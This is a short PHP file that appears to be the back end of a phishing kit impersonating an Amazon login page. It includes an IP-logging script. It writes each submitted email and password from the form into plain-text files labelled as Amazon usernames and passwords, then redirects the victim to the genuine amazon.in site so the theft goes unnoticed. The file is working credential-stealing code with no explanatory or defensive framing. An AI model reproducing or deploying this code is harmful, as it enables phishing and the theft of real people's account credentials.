<?php
include 'ip.php';
file_put_contents("usernames.txt", "Amazon Username : " . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Amazon Password : " . $pass = $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.amazon.in/');
?>
